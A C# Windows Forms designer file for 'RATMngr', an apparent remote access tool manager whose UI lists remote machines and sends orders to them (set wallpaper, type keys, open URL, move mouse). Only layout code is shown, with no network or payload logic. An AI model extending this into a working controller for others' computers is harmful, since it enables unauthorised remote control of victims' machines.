namespace RATMngr
{
    partial class RatMngrForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.remBox = new System.Windows.Forms.ListBox();
            this.label1 = new System.Windows.Forms.Label();
            this.orderBox = new System.Windows.Forms.ListBox();
            this.label2 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.label4 = new System.Windows.Forms.Label();
            this.mouseIntensityUpDown = new System.Windows.Forms.NumericUpDown();
            this.label3 = new System.Windows.Forms.Label();
            this.friendlyBox = new System.Windows.Forms.TextBox();
            this.remRandomKeys = new System.Windows.Forms.CheckBox();
            this.remMoveMouse = new System.Windows.Forms.CheckBox();
            this.mouseIntervalUpDown = new System.Windows.Forms.NumericUpDown();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.keyIntervalUpDown = new System.Windows.Forms.NumericUpDown();
            this.saveBtn = new System.Windows.Forms.Button();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.typeBox = new System.Windows.Forms.ComboBox();
            this.label7 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.remoteLabel = new System.Windows.Forms.Label();
            this.dataBox = new System.Windows.Forms.TextBox();
            this.label9 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.sendOrderBtn = new System.Windows.Forms.Button();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.updateBtn = new System.Windows.Forms.Button();
            this.groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.mouseIntensityUpDown)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.mouseIntervalUpDown)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.keyIntervalUpDown)).BeginInit();
            this.groupBox2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // remBox
            // 
            this.remBox.FormattingEnabled = true;
            this.remBox.Location = new System.Drawing.Point(12, 35);
            this.remBox.Name = "remBox";
            this.remBox.Size = new System.Drawing.Size(246, 537);
            this.remBox.TabIndex = 0;
            this.remBox.SelectedIndexChanged += new System.EventHandler(this.remBox_SelectedIndexChanged);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(9, 19);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(49, 13);
            this.label1.TabIndex = 1;
            this.label1.Text = "Remotes";
            // 
            // orderBox
            // 
            this.orderBox.FormattingEnabled = true;
            this.orderBox.Location = new System.Drawing.Point(439, 35);
            this.orderBox.Name = "orderBox";
            this.orderBox.Size = new System.Drawing.Size(205, 537);
            this.orderBox.TabIndex = 2;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(436, 19);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(38, 13);
            this.label2.TabIndex = 3;
            this.label2.Text = "Orders";
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.saveBtn);
            this.groupBox1.Controls.Add(this.label6);
            this.groupBox1.Controls.Add(this.keyIntervalUpDown);
            this.groupBox1.Controls.Add(this.label5);
            this.groupBox1.Controls.Add(this.mouseIntervalUpDown);
            this.groupBox1.Controls.Add(this.label4);
            this.groupBox1.Controls.Add(this.mouseIntensityUpDown);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.friendlyBox);
            this.groupBox1.Controls.Add(this.remRandomKeys);
            this.groupBox1.Controls.Add(this.remMoveMouse);
            this.groupBox1.Location = new System.Drawing.Point(264, 35);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(169, 210);
            this.groupBox1.TabIndex = 4;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Settings";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(6, 70);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(80, 13);
            this.label4.TabIndex = 5;
            this.label4.Text = "mouseIntensity:";
            // 
            // mouseIntensityUpDown
            // 
            this.mouseIntensityUpDown.Location = new System.Drawing.Point(89, 66);
            this.mouseIntensityUpDown.Maximum = new decimal(new int[] {
            1000000,
            0,
            0,
            0});
            this.mouseIntensityUpDown.Name = "mouseIntensityUpDown";
            this.mouseIntensityUpDown.Size = new System.Drawing.Size(74, 20);
            this.mouseIntensityUpDown.TabIndex = 4;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(6, 22);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(46, 13);
            this.label3.TabIndex = 3;
            this.label3.Text = "Friendly:";
            // 
            // friendlyBox
            // 
            this.friendlyBox.Location = new System.Drawing.Point(63, 19);
            this.friendlyBox.Name = "friendlyBox";
            this.friendlyBox.Size = new System.Drawing.Size(100, 20);
            this.friendlyBox.TabIndex = 2;
            // 
            // remRandomKeys
            // 
            this.remRandomKeys.AutoSize = true;
            this.remRandomKeys.Location = new System.Drawing.Point(9, 118);
            this.remRandomKeys.Name = "remRandomKeys";
            this.remRandomKeys.Size = new System.Drawing.Size(84, 17);
            this.remRandomKeys.TabIndex = 1;
            this.remRandomKeys.Text = "randomKeys";
            this.remRandomKeys.UseVisualStyleBackColor = true;
            // 
            // remMoveMouse
            // 
            this.remMoveMouse.AutoSize = true;
            this.remMoveMouse.Location = new System.Drawing.Point(9, 45);
            this.remMoveMouse.Name = "remMoveMouse";
            this.remMoveMouse.Size = new System.Drawing.Size(84, 17);
            this.remMoveMouse.TabIndex = 0;
            this.remMoveMouse.Text = "moveMouse";
            this.remMoveMouse.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.remMoveMouse.UseVisualStyleBackColor = true;
            // 
            // mouseIntervalUpDown
            // 
            this.mouseIntervalUpDown.Location = new System.Drawing.Point(89, 92);
            this.mouseIntervalUpDown.Maximum = new decimal(new int[] {
            1000000,
            0,
            0,
            0});
            this.mouseIntervalUpDown.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            -2147483648});
            this.mouseIntervalUpDown.Name = "mouseIntervalUpDown";
            this.mouseIntervalUpDown.Size = new System.Drawing.Size(74, 20);
            this.mouseIntervalUpDown.TabIndex = 6;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(6, 94);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(76, 13);
            this.label5.TabIndex = 7;
            this.label5.Text = "mouseInterval:";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(6, 143);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(62, 13);
            this.label6.TabIndex = 9;
            this.label6.Text = "keyInterval:";
            // 
            // keyIntervalUpDown
            // 
            this.keyIntervalUpDown.Location = new System.Drawing.Point(89, 141);
            this.keyIntervalUpDown.Maximum = new decimal(new int[] {
            1000000,
            0,
            0,
            0});
            this.keyIntervalUpDown.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            -2147483648});
            this.keyIntervalUpDown.Name = "keyIntervalUpDown";
            this.keyIntervalUpDown.Size = new System.Drawing.Size(74, 20);
            this.keyIntervalUpDown.TabIndex = 8;
            // 
            // saveBtn
            // 
            this.saveBtn.Location = new System.Drawing.Point(88, 181);
            this.saveBtn.Name = "saveBtn";
            this.saveBtn.Size = new System.Drawing.Size(75, 23);
            this.saveBtn.TabIndex = 10;
            this.saveBtn.Text = "Save";
            this.saveBtn.UseVisualStyleBackColor = true;
            this.saveBtn.Click += new System.EventHandler(this.saveBtn_Click);
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.sendOrderBtn);
            this.groupBox2.Controls.Add(this.label10);
            this.groupBox2.Controls.Add(this.label9);
            this.groupBox2.Controls.Add(this.dataBox);
            this.groupBox2.Controls.Add(this.remoteLabel);
            this.groupBox2.Controls.Add(this.label8);
            this.groupBox2.Controls.Add(this.label7);
            this.groupBox2.Controls.Add(this.typeBox);
            this.groupBox2.Location = new System.Drawing.Point(264, 397);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(169, 175);
            this.groupBox2.TabIndex = 5;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Create Order";
            // 
            // typeBox
            // 
            this.typeBox.FormattingEnabled = true;
            this.typeBox.Items.AddRange(new object[] {
            "setBg",
            "typeKeys",
            "openUrl",
            "moveMouse"});
            this.typeBox.Location = new System.Drawing.Point(42, 19);
            this.typeBox.Name = "typeBox";
            this.typeBox.Size = new System.Drawing.Size(121, 21);
            this.typeBox.TabIndex = 0;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(6, 24);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(34, 13);
            this.label7.TabIndex = 1;
            this.label7.Text = "Type:";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(6, 54);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(47, 13);
            this.label8.TabIndex = 2;
            this.label8.Text = "Remote:";
            // 
            // remoteLabel
            // 
            this.remoteLabel.AutoSize = true;
            this.remoteLabel.Location = new System.Drawing.Point(63, 54);
            this.remoteLabel.Name = "remoteLabel";
            this.remoteLabel.Size = new System.Drawing.Size(0, 13);
            this.remoteLabel.TabIndex = 3;
            // 
            // dataBox
            // 
            this.dataBox.Location = new System.Drawing.Point(45, 80);
            this.dataBox.Name = "dataBox";
            this.dataBox.Size = new System.Drawing.Size(118, 20);
            this.dataBox.TabIndex = 4;
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(6, 83);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(33, 13);
            this.label9.TabIndex = 5;
            this.label9.Text = "Data:";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(6, 114);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(24, 13);
            this.label10.TabIndex = 6;
            this.label10.Text = "ID: ";
            // 
            // sendOrderBtn
            // 
            this.sendOrderBtn.Location = new System.Drawing.Point(45, 146);
            this.sendOrderBtn.Name = "sendOrderBtn";
            this.sendOrderBtn.Size = new System.Drawing.Size(75, 23);
            this.sendOrderBtn.TabIndex = 7;
            this.sendOrderBtn.Text = "Send";
            this.sendOrderBtn.UseVisualStyleBackColor = true;
            this.sendOrderBtn.Click += new System.EventHandler(this.sendOrderBtn_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::RATMngr.Properties.Resources.kuba;
            this.pictureBox1.InitialImage = global::RATMngr.Properties.Resources.Meme_Faces_4;
            this.pictureBox1.Location = new System.Drawing.Point(264, 251);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(169, 140);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 6;
            this.pictureBox1.TabStop = false;
            // 
            // updateBtn
            // 
            this.updateBtn.Location = new System.Drawing.Point(264, 6);
            this.updateBtn.Name = "updateBtn";
            this.updateBtn.Size = new System.Drawing.Size(75, 23);
            this.updateBtn.TabIndex = 7;
            this.updateBtn.Text = "Disable Update";
            this.updateBtn.UseVisualStyleBackColor = true;
            this.updateBtn.Click += new System.EventHandler(this.updateBtn_Click);
            // 
            // RatMngrForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(653, 581);
            this.Controls.Add(this.updateBtn);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.orderBox);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.remBox);
            this.Name = "RatMngrForm";
            this.Text = "RatMngr";
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.mouseIntensityUpDown)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.mouseIntervalUpDown)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.keyIntervalUpDown)).EndInit();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.ListBox remBox;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.ListBox orderBox;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.NumericUpDown mouseIntensityUpDown;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.TextBox friendlyBox;
        private System.Windows.Forms.CheckBox remRandomKeys;
        private System.Windows.Forms.CheckBox remMoveMouse;
        private System.Windows.Forms.NumericUpDown mouseIntervalUpDown;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.NumericUpDown keyIntervalUpDown;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Button saveBtn;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Button sendOrderBtn;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.TextBox dataBox;
        private System.Windows.Forms.Label remoteLabel;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.ComboBox typeBox;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Button updateBtn;
    }
}

